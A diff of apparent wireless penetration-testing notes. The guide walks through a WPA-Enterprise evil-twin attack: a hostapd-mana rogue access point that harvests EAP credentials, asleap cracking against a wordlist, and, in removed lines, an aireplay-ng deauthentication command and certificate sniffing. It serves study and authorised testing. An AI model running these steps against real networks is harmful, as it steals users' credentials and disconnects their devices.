@@ -158,29 +158,16 @@ airodump-ng wlan0mon
 sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
 ```
 4. Use freeradius to craft a CA certificate
-6. Move to the directory
-```
-cd /etc/freeradius/3.0/certs
-```
-5. Edit the ca.cnf
-```
-nano ca.cnf
-```
-6. Edit the server.cnf
-```
-nano server.cnf
-```
-7. Remove the current DH and regenerate Diffie-Hellman (DH)
+6. Remove the current DH and regenerate Diffie-Hellman (DH)
 ```
 rm dh
 ```
 ```
 make
 ```
-**If Certificate already exist, then run "make destroycerts" to clean up**
 
-8. Configure hostapd-mana to host a rougue AP
-9. Edit the configuration file
+7. Configure hostapd-mana to host a rougue AP
+8. Edit the configuration file
 ```
 nano /etc/hostapd-mana/mana.conf
 ```
@@ -240,39 +227,7 @@ mana_eapsuccess=1
 mana_eaptls=1
 ```
 
-**Or**
-
-```
-interface=wlan0
-driver=nl80211
-
-ssid=ssidofthewifi
-hw_mode=g
-channel=6
-macaddr_acl=0
-ignore_broadcast_ssid=0
-
-auth_algs=3
-wpa=2
-wpa_key_mgmt=WPA-EAP
-rsn_pairwise=CCMP
-
-ieee80821x=1
-eap_server=1
-eapol_version=2
-eapol_key_index_workaround=0
-eap_user_file=eap_user.conf
-
-ca_cert=ca.pem
-server_cert=server.pem
-private_key=server.key
-dh_file=dh
-
-mana_wpe=1
-mana_credout_credout
-mana_eapsuccess=1
-```
-10. Create EAP user file
+9. Create EAP user file
 ```
 nano /etc/hostapd-mana/mana.eap_user
 ```
@@ -280,44 +235,13 @@ nano /etc/hostapd-mana/mana.eap_user
 *     PEAP,TTLS,TLS,FAST
 "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
 ```
-11. Start the rogue AP
+10. Start the rogue AP
 ```
 sudo hostapd-mana /etc/hostapd-mana/mana.conf
 ```
-**Remark**
-- method 25 = PEAP
-- Credentials store in `/tmp/hostapd.credout`
-12. Crack the password
+11. Crack the password
 ```
 asleap -C <challengekey> -R <responsekey> -W /usr/share/john/password.lst
-```
-**-----Sniff the traffic to make the certificate looks similar with the real AP (Optional)-----**
-1. Deauthentication attack
-```
-aireplay-ng -0 1 -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon 
-```
-2. Stop the monitor mode
-```
-sudo airmon-ng stop wlan0mon
-```
-3. Analyze the captured file with Wireshark
-4. Filter the certificate by using `wlan.bssid==00:00:00:00:00:00 && eap && tls.handshake.certificate`
-```
-tshark -r <capturedfile> -Y "eap && tls.handshake.certificate && frame.number == <packet number>" -V
-```
-5. Packet Details pane - Open Extensible Authentication Protocol - Transport Layer Security
-6. Select `Export Packet Bytes` to save the data into a file with a .der extension.
-```
-tshark -r <capturedfile> -Y "frame.number == <packet number>" -T fields -e tls.handshake.cert_data > certificate.der
-```
-7.
-```
-   openssl x509 -inform der -in CERTIFICATE_FILENAME.der -text
-   openssl x509 -in CERT_FILENAME -noout -enddate 
-```
-8. View Identity in Extensible Authentication Protocol
-```
-tshark -r <capturedfile> -Y "eapol && frame.number == <packet number>" -V
 ```
 
 **Manual Craft CA cert**
